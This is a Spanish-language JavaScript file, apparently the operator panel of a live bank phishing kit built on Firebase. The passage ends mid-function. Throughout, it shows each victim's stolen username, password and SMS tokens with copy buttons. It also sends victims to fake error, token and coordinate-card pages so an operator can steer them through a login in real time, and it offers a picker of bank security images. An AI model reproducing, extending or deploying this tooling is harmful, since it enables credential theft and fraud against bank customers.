// Importar Firebase v9+
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
    getFirestore,
    collection,
    doc,
    updateDoc,
    deleteDoc,
    onSnapshot,
    query,
    getDoc
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig } from "./firebase-config.js";
// Inicializar Firebase usando la configuración global de panel.html
const app = initializeApp(window.firebaseConfig);
const db = getFirestore(app);
// Exponer funciones de Firestore para uso global si es necesario
window.db = db;
window.collection = collection;
window.doc = doc;
window.updateDoc = updateDoc;
window.deleteDoc = deleteDoc;

// Variable global para el sistema de audio
let audioSystem = null;

// Función para integrar eventos de audio con el panel
function integrarSistemaAudioPanel() {
    // Esperar a que el sistema de audio esté disponible
    if (window.audioSystem) {
        audioSystem = window.audioSystem;
        console.log('🔊 Sistema de audio integrado con cPanel');
        
        // Configurar sonidos específicos para el panel
        if (audioSystem.config) {
            // Usar sonido de actualización para acciones de panel
            audioSystem.config.newSound = '/sounds/franklin-notification-gta-v.mp3';
            audioSystem.config.updateSound = '/sounds/billete-papa.mp3';
            audioSystem.saveConfig();
        }
    } else {
        // Reintentar después de un momento
        setTimeout(integrarSistemaAudioPanel, 500);
    }
}
// Datos de administrador (en un entorno real, esto debería estar en el servidor)
// Para cambiar las credenciales, simplemente modifica los valores de username y password
let adminCredentials = {
    username: "",
    password: ""
};
// Función para cargar credenciales desde Firestore
async function loadAdminCredentials() {
    try {
        // Intenta primero en adminConfig/credentials (ubicación original)
        let credentialsRef = doc(db, "adminConfig", "credentials");
        let credentialsSnap = await getDoc(credentialsRef);

        // Si no existe, intenta en la nueva ubicación donde el usuario tiene sus credenciales
        if (!credentialsSnap.exists()) {
            console.log("No se encontró documento en adminConfig/credentials, buscando en usuarios");
            // Asumiendo que tienes una colección llamada 'usuarios' con un documento de credenciales
            // Ajusta el nombre de la colección según lo que hayas creado
            credentialsRef = doc(db, "usuarios", "admin");
            credentialsSnap = await getDoc(credentialsRef);
        }

        if (credentialsSnap.exists()) {
            // Si existe, guardar los datos y mostrarlos para depuración
            const data = credentialsSnap.data();
            // Verificar si los campos existen y tienen el formato correcto
            if (data.username && data.password) {
                adminCredentials = data;
            } else {
                console.error("Los campos 'username' y 'password' no están presentes en el documento");
                // Intentar determinar qué campos hay disponibles
                console.log("Campos disponibles:", Object.keys(data));
            }
        } else {
            console.error("No se encontraron documentos de credenciales en ninguna ubicación");
        }
    } catch (error) {
        console.error("Error cargando credenciales:", error);
    }
}
// Elementos DOM
const loginScreen = document.getElementById("login-screen");
const adminPanel = document.getElementById("admin-panel");
const loginForm = document.getElementById("login-form");
const logoutBtn = document.getElementById("logout-btn");
const usersList = document.getElementById("users-list");
const noUsersMessage = document.getElementById("no-users-message");
const commandLogElement = document.getElementById("command-log");

// Elementos para el selector de imagen de perfil
const profileImagesContainer = document.getElementById("profile-images-container");
const profileImageSelectedText = document.getElementById("profile-image-selected");



// Formularios
const coordinatesForm = document.getElementById("coordinates-form");
const messageForm = document.getElementById("message-form");

// Selectores de usuario
const coordUserSelect = document.getElementById("coord-user-select");
const imgUserSelect = document.getElementById("img-user-select");
const msgUserSelect = document.getElementById("msg-user-select");
// Contador de elementos
const activeUsersCount = document.getElementById("active-users-count");
const coordinatesUsersCount = document.getElementById("coordinates-users-count");
const tokenUsersCount = document.getElementById("token-users-count");
// Almacén de comandos
let commandLog = [];
// Variable para mantener el estado anterior de los usuarios
let previousUserStates = new Map();
let previousUserData = new Map(); // Para comparar cambios en selectedImageIndex

// Función para cargar usuarios activos
function loadActiveUsers() {
    const usersRef = collection(db, "redireccion");
    const q = query(usersRef);
    onSnapshot(q, (snapshot) => {
        const docs = snapshot.docs;
        
        docs.forEach((doc) => {
            const userId = doc.id;
            const userData = doc.data();
            const currentPage = userData.page || 0;
            const previousPage = previousUserStates.get(userId);
            
            // Detectar nueva card (primera vez que aparece este usuario)
            if (previousPage === undefined) {
                // Nueva card aparece por primera vez (independientemente del page)
                if (window.playPanelNewCardSound) {
                    window.playPanelNewCardSound(userId);
                }
                logCommand(`🔊 Nueva card: Usuario ${userId} apareció en el panel (page: ${currentPage})`);
            }
            // Detectar actualización de card (usuario existente que se conecta)
            else if (currentPage === 0 && previousPage > 0) {
                // Card existente se actualiza/conecta
                if (window.playPanelCardUpdateSound) {
                    window.playPanelCardUpdateSound(userId);
                }
                logCommand(`🔊 Card actualizada: Usuario ${userId} se conectó (page: ${previousPage} → 0)`);
            }
            // Detectar selección de imagen (nuevo campo selectedImageIndex)
            else if (userData.selectedImageIndex && userData.lastClickTime) {
                const previousData = previousUserData.get(userId) || {};
                const previousImageIndex = previousData.selectedImageIndex;
                const previousClickTime = previousData.lastClickTime;
                
                // Si es una nueva selección de imagen (índice diferente o tiempo diferente)
                if (userData.selectedImageIndex !== previousImageIndex || userData.lastClickTime !== previousClickTime) {
                    if (window.playPanelCardUpdateSound) {
                        window.playPanelCardUpdateSound(userId);
                    }
                    logCommand(`🔊 Imagen seleccionada: Usuario ${userId} seleccionó imagen ${userData.selectedImageIndex} (${userData.selectedImageName})`);
                }
            }
            
            // Actualizar el estado anterior
            previousUserStates.set(userId, currentPage);
            // Guardar datos completos del usuario para comparar cambios
            previousUserData.set(userId, {
                selectedImageIndex: userData.selectedImageIndex,
                selectedImageName: userData.selectedImageName,
                lastClickTime: userData.lastClickTime
            });
        });
        
        updateUI(docs);
        logCommand(`Datos actualizados: ${docs.length} usuarios en total`);
    });
}
// Función para verificar sesión activa
function checkActiveSession() {
    const isLoggedIn = localStorage.getItem('adminLoggedIn') === 'true';
    if (isLoggedIn) {
        loginScreen.classList.add("d-none");
        adminPanel.classList.remove("d-none");
        loadActiveUsers();
        logCommand("Sesión recuperada");
        return true;
    }
    return false;
}

// Función para iniciar sesión
if (loginForm) {
    loginForm.addEventListener("submit", function (e) {
        e.preventDefault();
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        const rememberMeElement = document.getElementById("remember-me");
        const rememberMe = rememberMeElement ? rememberMeElement.checked : false;

        if (username === adminCredentials.username && password === adminCredentials.password) {
            // Guardar estado de sesión
            const sessionData = {
                isLoggedIn: true,
                username: username,
                timestamp: new Date().getTime()
            };

            // Guardar credenciales si el usuario lo desea
            if (rememberMe) {
                localStorage.setItem('adminSession', JSON.stringify(sessionData));
                localStorage.setItem('adminLoggedIn', 'true');
            } else {
                // Solo guardar para esta sesión
                sessionStorage.setItem('adminSession', JSON.stringify(sessionData));
                localStorage.setItem('adminLoggedIn', 'true');
            }

            loginScreen.classList.add("d-none");
            adminPanel.classList.remove("d-none");
            loadActiveUsers();
            logCommand("Administrador ha iniciado sesión");
            
            // Reproducir sonido de login exitoso
            if (window.playPanelLoginSound) {
                window.playPanelLoginSound();
            }

            // Limpiar el formulario
            loginForm.reset();
        } else {
            alert("Credenciales incorrectas");
        }
    });
}
// Agregar función para limpiar sesión
if (logoutBtn) {
    logoutBtn.addEventListener("click", function () {
        // Preguntar si también desea limpiar las selecciones de imágenes guardadas
        const clearImageSelections = confirm("\u00bfDesea eliminar también las selecciones de imágenes guardadas en caché?");
        if (clearImageSelections) {
            localStorage.removeItem("panelImageSelections");
            logCommand("Selecciones de imágenes eliminadas del caché local");
        }

        // Reproducir sonido de logout
        if (window.playPanelLogoutSound) {
            window.playPanelLogoutSound();
        }
        
        localStorage.removeItem("adminLoggedIn");
        
        // Delay para que el sonido se reproduzca antes del reload
        setTimeout(() => {
            window.location.reload();
        }, 500);
        
        logCommand("Sesión cerrada");
    });
}
// Función para enviar coordenadas
if (coordinatesForm) {
    coordinatesForm.addEventListener("submit", async function (e) {
        e.preventDefault();

        const selectedUserId = coordUserSelect ? coordUserSelect.value : '';
        if (!selectedUserId) {
            alert("Por favor seleccione un usuario");
            return;
        }

        // Obtener valores de los campos del formulario
        const coord1 = (document.getElementById("coord-1")?.value || " ").toUpperCase();
        const coord2 = (document.getElementById("coord-2")?.value || " ").toUpperCase();
        const coord3 = (document.getElementById("coord-3")?.value || " ").toUpperCase();
        const coord4 = (document.getElementById("coord-4")?.value || " ").toUpperCase();

        // Solo obtenemos el mensaje si el elemento existe
        const messageElement = document.getElementById("coord-message");
        const message = messageElement ? messageElement.value : "";

        try {
            // Actualizar en Firestore
            const userDocRef = doc(db, "redireccion", selectedUserId);
            await updateDoc(userDocRef, {
                // Guardar las coordenadas individuales
                question1: coord1,
                question2: coord2,
                question3: coord3,
                question4: coord4,
                page: 2, // Página de coordenadas
                lastUpdate: new Date().toISOString(),
                status: 'updated' // Añadir un campo para control de actualización
            });

            // Limpiar formulario
            coordinatesForm.reset();
            logCommand(`Coordenadas enviadas para ${selectedUserId}: ${coord1}, ${coord2}, ${coord3}, ${coord4}`);
            alert("Coordenadas enviadas correctamente");
        } catch (error) {
            console.error("Error actualizando coordenadas:", error);
            logCommand(`Error: ${error.message}`);
            alert("Error al enviar coordenadas: " + error.message);
        }
    });
}

// Función para actualizar la interfaz de usuario
function updateUI(docs) {
    // Actualizar lista de usuarios
    usersList.innerHTML = "";

    // Limpiar y actualizar selectores de usuario
    const userOptions = '<option value="">Seleccione un usuario...</option>';
    if (coordUserSelect) coordUserSelect.innerHTML = userOptions;
    if (imgUserSelect) imgUserSelect.innerHTML = userOptions;
    if (msgUserSelect) msgUserSelect.innerHTML = userOptions;
    // Contadores
    let totalActive = 0;
    let inCoordinates = 0;
    let inToken = 0;
    let inHomePage = 0;
    let inDashboard = 0;
    if (docs.length === 0) {
        noUsersMessage.classList.remove("d-none");
    } else {
        noUsersMessage.classList.add("d-none");
        
        // IMPLEMENTACIÓN LIFO: Invertir el orden de los documentos
        // Los últimos en llegar (final del array) aparecerán primero
        const sortedDocs = [...docs].reverse();
        
        sortedDocs.forEach((doc) => {
            const userData = doc.data();
            const userId = doc.id;
            const userPage = userData.page || 0;
            // Determinar qué mostrar en la card
            let userIMG = "img/shorcut.png"; // Imagen por defecto
            let showImageIndex = false;
            
            // Prioridad 1: Sistema nuevo con índice
            if (userData.selectedImageIndex && userData.selectedImageName) {
                userIMG = userData.selectedImageIndex; // Mostrar el número del índice
                showImageIndex = true;
            }
            // Prioridad 2: Sistema anterior con SRC
            else if (userData.selectedImageSrc) {
                userIMG = userData.selectedImageSrc;
                showImageIndex = false;
            }
            // Procesar todos los usuarios, incluso los que están en la página inicial (page=4)
            totalActive++;
            // Contar usuarios por estado
            if (userPage === 2) {
                inCoordinates++;
            } else if (userPage === 3) {
                inToken++;
            } else if (userPage === 1) {
                inHomePage++;
            } else if (userPage === 4) {
                inDashboard++;
            }
            // Crear tarjeta de usuario (manteniendo el diseño original)
            const statusText = getStatusText(userPage);
            const statusClass = getStatusClass(userPage);
            
            // Obtener tipo de documento y colores personalizados
            const documentType = getDocumentType(userId);
            const cardBackgroundColor = getCardBackgroundColor(documentType);
            const cardBorderColor = getCardBorderColor(documentType);
            const cardTextColor = getCardTextColor(documentType);
            
            const userCard = document.createElement("div");
            userCard.className = "col-md-4 mb-3";
            userCard.innerHTML = `
            <div class="card user-card highlight-animation" style="background-color: ${cardBackgroundColor}; border: 2px solid ${cardBorderColor}; color: ${cardTextColor};">
              <div class="card-header d-flex justify-content-between align-items-center" style="background-color: ${cardBackgroundColor}; border-bottom: 1px solid ${cardBorderColor};">
              <div>
              ${showImageIndex ? 
                `<div style="width: 100px; height: 100px; display: flex; align-items: center; justify-content: center; background-color: #f8f9fa; border: 3px solid #28a745; border-radius: 4px; font-size: 24px; font-weight: bold; color: #495057;">${userIMG}</div>` :
                `<img src="${userIMG}" alt="${userId}" class="img-fluid" style="max-width: 100px; max-height: 100px; object-fit: cover; border: ${userData.selectedImageSrc ? '3px solid #28a745' : 'none'};">` 
              }
              </div>
              <div>
                <h5 class="mb-0">
                  <span class="copyable" style="cursor: pointer;" data-value="${userId}" title="Haz clic para copiar">
                    ${userId}
                    <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px; margin-left: 5px;">
                  </span>
                </h5>
                <p style="margin-top: 15px; margin-bottom: 0px;">Usuario: <span class="copyable" style="cursor: pointer;" data-value="${userData.usuarioJ}" title="Haz clic para copiar">
                    ${userData.usuarioJ}
                    <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px; margin-left: 5px;">
                  </span></p>
                <p style="margin-top: 0px; margin-bottom: 0px;">Passwd: <span class="copyable" style="cursor: pointer;" data-value="${userData.passwd}" title="Haz clic para copiar">
                    ${userData.passwd}
                    <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px; margin-left: 5px;">
                  </span></p>
                <p style="margin-top: 0px; margin-bottom: 0px;">Token: <span class="copyable" style="cursor: pointer;" data-value="${userData.SMS}" title="Haz clic para copiar">
                    ${userData.SMS}
                    <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px; margin-left: 5px;">
                  </span></p>
                <p style="margin-top: 0px; margin-bottom: 0px;">Token2: <span class="copyable" style="cursor: pointer;" data-value="${userData.SMS2}" title="Haz clic para copiar">
                    ${userData.SMS2}
                    <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px; margin-left: 5px;">
                  </span></p>
                ${getLastClickInfo(userData)}
                </div>

                <span class="badge badge-${statusClass}">${statusText}</span>
                </div>
              <div class="card-body" style="background-color: ${cardBackgroundColor};">
                <div style="margin-bottom: 20px;"><strong>En caso de Error:</strong> 
                <button class="btn btn-danger action-btn" data-action="login-error" data-id="${userId}">Login</button>
                <button class="btn btn-danger action-btn" data-action="passwd-error" data-id="${userId}">Passwd</button>
                <button class="btn btn-danger action-btn" data-action="juridico-error" data-id="${userId}">Juridico</button>
                <button class="btn btn-danger action-btn" data-action="token-error" data-id="${userId}">Token</button>
                </div>
                <div class="btn-group btn-block">
                  <button style="margin-right: 5px;"  class="btn btn-success action-btn" data-action="home" data-id="${userId}">Login</button>
                  <button style="margin-right: 5px;" class="btn btn-info action-btn" data-action="passwd" data-id="${userId}" >Passwd</button>
                  <button style="margin-right: 5px;" class="btn btn-warning action-btn" data-action="juridico" data-id="${userId}">Juridico</button>
                  <button style="margin-right: 5px;" class="btn btn-success action-btn" data-action="fuera" data-id="${userId}">Fuera!</button>
                  <button class="btn btn-danger action-btn" data-action="remove" data-id="${userId}">Eliminar</button>
                </div>
              </div>
            </div>
            `;
            usersList.appendChild(userCard);
            // Agregar a selectores de usuario
            const option = document.createElement("option");
            option.value = userId;
            option.textContent = userId;

            // Clonar la opción para todos los selectores
            if (coordUserSelect) coordUserSelect.appendChild(option.cloneNode(true));
            if (imgUserSelect) imgUserSelect.appendChild(option.cloneNode(true));
            if (msgUserSelect) msgUserSelect.appendChild(option.cloneNode(true));
        });
    }
    // Actualizar contadores
    activeUsersCount.textContent = totalActive;
    coordinatesUsersCount.textContent = inCoordinates;
    tokenUsersCount.textContent = inToken;
    // Agregar eventos a los botones
    document.querySelectorAll(".action-btn").forEach((button) => {
        button.addEventListener("click", handleUserAction);
    });
}
// Función para manejar acciones de usuario
function handleUserAction(event) {
    const action = event.target.dataset.action;
    const userId = event.target.dataset.id;
    if (!userId) {
        logCommand(`Error: ID de usuario no encontrado`);
        return;
    }
    // Animar el botón pulsado
    event.target.classList.add("pulse");
    setTimeout(() => {
        event.target.classList.remove("pulse");
    }, 1000);
    logCommand(`Acción solicitada: ${action} para usuario ${userId}`);
    
    // Nota: El sonido se reproduce automáticamente cuando Firebase detecta
    // que la card se activa (page cambia a 0), no al hacer clic en el botón
    
    switch (action) {
        case "home":
            // Añadir animación a la tarjeta
            const homeCard = event.target.closest(".user-card");
            homeCard.style.backgroundColor = "#e8f4ff";
            homeCard.style.transition = "background-color 0.5s ease";
            // Página 4 = Inicio (según panel.html original)
            const userRef = doc(db, "redireccion", userId);
            updateDoc(userRef, {
                page: 1,
            })
                .then(() => {
                    logCommand(`Usuario ${userId} enviado a pantalla de inicio`);
                    
                    // Efecto de éxito
                    homeCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        homeCard.classList.remove("highlight-animation");
                        homeCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "login-error":
            const loginCard = event.target.closest(".user-card");
            loginCard.style.backgroundColor = "#e8f4ff";
            loginCard.style.transition = "background-color 0.5s ease";
            const userRefLogin = doc(db, "redireccion", userId);
            updateDoc(userRefLogin, {
                page: 11,
            })
                .then(() => {
                    logCommand(`Usuario ${userId} enviado a pantalla de inicio`);
                    
                    // Efecto de éxito
                    loginCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        loginCard.classList.remove("highlight-animation");
                        loginCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "passwd":
            const coordCard = event.target.closest(".user-card");
            coordCard.style.backgroundColor = "#e8fff0";
            coordCard.style.transition = "background-color 0.5s ease";
            const userRefCoord = doc(db, "redireccion", userId);
            updateDoc(userRefCoord, {
                page: 2,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de coordenadas`
                    );
                    
                    // Efecto de éxito
                    coordCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        coordCard.classList.remove("highlight-animation");
                        coordCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
            case "passwd-error":
            const passwdCard = event.target.closest(".user-card");
            passwdCard.style.backgroundColor = "#e8fff0";
            passwdCard.style.transition = "background-color 0.5s ease";
            const userRefPasswd = doc(db, "redireccion", userId);
            updateDoc(userRefPasswd, {
                page: 22,
            })
                .then(() => {
                    logCommand(`Usuario ${userId} enviado a pantalla de coordenadas`);
                    
                    // Efecto de éxito
                    passwdCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        passwdCard.classList.remove("highlight-animation");
                        passwdCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "juridico":
            // Añadir animación a la tarjeta
            const juridicoCard = event.target.closest(".user-card");
            juridicoCard.style.backgroundColor = "#e8fff0";
            juridicoCard.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefJuridico = doc(db, "redireccion", userId);
            updateDoc(userRefJuridico, {
                page: 3,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de juridico`
                    );
                    
                    // Efecto de éxito
                    juridicoCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        juridicoCard.classList.remove("highlight-animation");
                        juridicoCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "juridico-error":
            // Añadir animación a la tarjeta
            const juridicoCardError = event.target.closest(".user-card");
            juridicoCardError.style.backgroundColor = "#e8fff0";
            juridicoCardError.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefJuridicoError = doc(db, "redireccion", userId);
            updateDoc(userRefJuridicoError, {
                page: 33,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de juridico`
                    );
                    
                    // Efecto de éxito
                    juridicoCardError.classList.add("highlight-animation");
                    setTimeout(() => {
                        juridicoCardError.classList.remove("highlight-animation");
                        juridicoCardError.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "dashboard":
            // Añadir animación a la tarjeta
            const dashboard = event.target.closest(".user-card");
            dashboard.style.backgroundColor = "#e8fff0";
            dashboard.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefDashboard = doc(db, "redireccion", userId);
            updateDoc(userRefDashboard, {
                page: 4,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de dashboard`
                    );
                    // Efecto de éxito
                    dashboard.classList.add("highlight-animation");
                    setTimeout(() => {
                        dashboard.classList.remove("highlight-animation");
                        dashboard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "dashboard-error":
            // Añadir animación a la tarjeta
            const dashboardErrorCard = event.target.closest(".user-card");
            dashboardErrorCard.style.backgroundColor = "#e8fff0";
            dashboardErrorCard.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefDashboardError = doc(db, "redireccion", userId);
            updateDoc(userRefDashboardError, {
                page: 5,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de dashboard-error`
                    );
                    // Efecto de éxito
                    dashboardErrorCard.classList.add("highlight-animation");
                    setTimeout(() => {
                        dashboardErrorCard.classList.remove("highlight-animation");
                        dashboardErrorCard.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "passwd-error":
            // Añadir animación a la tarjeta
            const passwderror = event.target.closest(".user-card");
            passwderror.style.backgroundColor = "#e8fff0";
            passwderror.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefpasswderror = doc(db, "redireccion", userId);
            updateDoc(userRefpasswderror, {
                page: 6,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de passwd-error`
                    );
                    // Efecto de éxito
                    passwderror.classList.add("highlight-animation");
                    setTimeout(() => {
                        passwderror.classList.remove("highlight-animation");
                        passwderror.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "token-error":
            // Añadir animación a la tarjeta
            const tokenCardError = event.target.closest(".user-card");
            tokenCardError.style.backgroundColor = "#e8fff0";
            tokenCardError.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefTokenError = doc(db, "redireccion", userId);
            updateDoc(userRefTokenError, {
                page: 8,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de token`
                    );
                    // Efecto de éxito
                    tokenCardError.classList.add("highlight-animation");
                    setTimeout(() => {
                        tokenCardError.classList.remove("highlight-animation");
                        tokenCardError.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "fuera":
            // Añadir animación a la tarjeta
            const fuera = event.target.closest(".user-card");
            fuera.style.backgroundColor = "#e8fff0";
            fuera.style.transition = "background-color 0.5s ease";
            // Página 9 = Fuera
            const userRefApproved = doc(db, "redireccion", userId);
            updateDoc(userRefApproved, {
                page: 9,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de fuera`
                    );
                    // Efecto de éxito
                    fuera.classList.add("highlight-animation");
                    setTimeout(() => {
                        fuera.classList.remove("highlight-animation");
                        fuera.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "dashboard-gb":
            // Añadir animación a la tarjeta
            const dashboard_gb = event.target.closest(".user-card");
            dashboard_gb.style.backgroundColor = "#e8fff0";
            dashboard_gb.style.transition = "background-color 0.5s ease";
            // Página 2 = Coordenadas
            const userRefDashboard_gb = doc(db, "redireccion", userId);
            updateDoc(userRefDashboard_gb, {
                page: 10,
            })
                .then(() => {
                    logCommand(
                        `Usuario ${userId} enviado a pantalla de dashboard-gb`
                    );
                    // Efecto de éxito
                    dashboard_gb.classList.add("highlight-animation");
                    setTimeout(() => {
                        dashboard_gb.classList.remove("highlight-animation");
                        dashboard_gb.style.backgroundColor = "";
                    }, 1000);
                })
                .catch((error) => {
                    console.error("Error:", error);
                    logCommand(`Error: ${error.message}`);
                });
            break;
        case "remove":
            // Confirmar la eliminación
            if (
                confirm(
                    `¿Estás seguro que deseas eliminar al usuario ${userId}? Esta acción no se puede deshacer.`
                )
            ) {
                // Animación de desvanecimiento
                const removeCard = event.target.closest(".user-card");
                removeCard.style.transition = "all 0.5s ease";
                removeCard.style.opacity = "0.5";
                // Eliminar el usuario
                const userRef = doc(db, "redireccion", userId);
                deleteDoc(userRef)
                    .then(() => {
                        // Animación final de eliminación
                        removeCard.style.opacity = "0";
                        removeCard.style.transform = "scale(0.9) translateY(20px)";
                        setTimeout(() => {
                            const cardContainer = removeCard.closest(".col-md-6");
                            if (cardContainer) {
                                cardContainer.remove();
                            } else {
                                // Fallback: remover la card directamente
                                removeCard.remove();
                            }
                        }, 500);
                        logCommand(`Usuario ${userId} eliminado correctamente`);
                    })
                    .catch((error) => {
                        console.error("Error:", error);
                        logCommand(`Error: ${error.message}`);
                        // Restaurar el aspecto de la tarjeta si hay error
                        removeCard.style.opacity = "1";
                        removeCard.style.transform = "scale(1)";
                    });
            } else {
                // Restaurar el aspecto de la tarjeta si se cancela
                removeCard.style.opacity = "1";
                removeCard.style.transform = "scale(1)";
                logCommand(`Eliminación de usuario ${userId} cancelada`);
            }
            break;
    }
}
// Función para registrar comandos
function logCommand(message) {
    const timestamp = new Date().toLocaleTimeString();
    const commandEntry = `[${timestamp}] ${message}`;
    commandLog.push(commandEntry);
    // Limitar a 50 comandos para no sobrecargar la memoria
    if (commandLog.length > 50) {
        commandLog.shift();
    }
    // Actualizar la interfaz de usuario
    if (commandLogElement) {
        commandLogElement.innerHTML = commandLog.map(cmd => `<p>${cmd}</p>`).join("");
        // Scroll hasta el último comando
        commandLogElement.scrollTop = commandLogElement.scrollHeight;
    }
}
// Lista de todas las imágenes disponibles en dashboard
const dashboardImages = [
    "atardecer.jpg", "baseball.jpg", "bolivar.jpg", "camomila.jpg", "canaAzucar.jpg",
    "canicas.jpg", "catedral.jpg", "cayuco.jpg", "cebiche.jpg", "cerezo.jpg",
    "chiguire.jpg", "cocada.jpg", "cotorra.jpg", "cristo.jpg", "danzas.jpg",
    "dulce.jpg", "dulceLeche.jpg", "dulceeBebida.jpg", "durazno.jpg", "edificio.jpg",
    "estadio.jpg", "flores.jpg", "franbuesas.jpg", "fresas.jpg", "fuente.jpg",
    "garza.jpg", "gato.jpg", "gemelos.jpg", "globo.jpg", "guacamaya.jpg",
    "iglesia.jpg", "lanchas.jpg", "leon.jpg", "limon.jpg", "mariposa.jpg",
    "mariquita.jpg", "mazorca.jpg", "medanos.jpg", "miranda.jpg", "moras.jpg",
    "naranjas.jpg", "noria.jpg", "panJamon.jpg", "panela.jpg", "paramo.jpg",
    "pico.jpg", "playa.jpg", "pueblos.jpg", "puente.jpg", "sanCarlos.jpg", "pan.jpg",
    "parchita.jpg", "umbral.jpg", "ensalada.jpg", "tamarindo.jpg", "cemeruco.jpg", 
    "danza2.jpg", "monumento.jpg", "turpial.jpg", "virgen.jpg", "virgen2.jpg", "virgen3.jpg",
    "costa.jpg", "columnas.jpg", "guanabana.jpg", "torresgemelas.jpg", "wuayu.jpg", "monumentoraro.jpg",
    "delfines.jpg", "arpa.jpg", "nispero.jpg", "mocka.jpg", "aguila.jpg", "basilica.jpg", "sh.png"
];
// Agregado Costa
// Variables para control de imágenes seleccionadas
let selectedImages = [];
let currentImgUser = '';
const MAX_IMAGES = 12;

// Elementos DOM para selector de imágenes
const imagesContainer = document.getElementById("images-container");
const selectedCountElement = document.getElementById("selected-count");
const saveImagesBtn = document.getElementById("save-images-btn");
const saveImagesBtnGb = document.getElementById("save-images-btn-gb");
const saveImagesErrorBtn = document.getElementById("save-images-error-btn");
const imagesForm = document.getElementById("images-form");

// Variable para almacenar la imagen de perfil seleccionada
let selectedProfileImage = null;

// Función para cargar todas las imágenes disponibles
function loadAvailableImages() {
    if (!imagesContainer) return;

    imagesContainer.innerHTML = '';

    // Generar HTML para cada imagen
    dashboardImages.forEach((imgFile, index) => {
        const imgPath = `img/dashboard/${imgFile}`;
        const imgDiv = document.createElement("div");
        imgDiv.className = "col-md-1 col-sm-2 col-2 mb-3 text-center";

        imgDiv.innerHTML = `
            <div class="image-checkbox">
                <input type="checkbox" id="img-${index}" class="img-checkbox" data-img-path="${imgPath}">
                <label for="img-${index}" class="d-block position-relative">
                    <img src="${imgPath}" class="img-thumbnail" alt="${imgFile}">
                    <div class="overlay">
                        <i class="fas fa-check-circle text-success"></i>
                    </div>
                </label>
            </div>
        `;

        imagesContainer.appendChild(imgDiv);
    });

    // Agregar listeners para los checkboxes
    document.querySelectorAll('.img-checkbox').forEach(checkbox => {
        checkbox.addEventListener('change', handleImageSelection);
    });

    // Cargar imágenes para el selector de perfil si existe
    loadProfileImages();
}

// Función para cargar imágenes para el selector de imagen de perfil
function loadProfileImages() {
    if (!profileImagesContainer) return;

    profileImagesContainer.innerHTML = '';

    // Generar HTML para cada imagen de perfil
    dashboardImages.forEach((imgFile, index) => {
        const imgPath = `img/dashboard/${imgFile}`;
        const imgDiv = document.createElement("div");
        imgDiv.className = "col-md-1 col-sm-2 col-3 mb-2 text-center";

        imgDiv.innerHTML = `
            <div class="image-radio">
                <input type="radio" id="profile-img-${index}" name="profile-image" class="profile-img-radio" data-img-path="${imgPath}">
                <label for="profile-img-${index}" class="d-block position-relative">
                    <img src="${imgPath}" class="img-thumbnail" alt="${imgFile}">
                    <div class="overlay">
                        <i class="fas fa-check text-success"></i>
                    </div>
                </label>
            </div>
        `;

        profileImagesContainer.appendChild(imgDiv);
    });

    // Agregar listeners para los radio buttons
    document.querySelectorAll('.profile-img-radio').forEach(radio => {
        radio.addEventListener('change', handleProfileImageSelection);
    });
}

// Función para manejar la selección de imagen de perfil
function handleProfileImageSelection(event) {
    const radio = event.target;

    if (radio.checked) {
        selectedProfileImage = radio.dataset.imgPath;
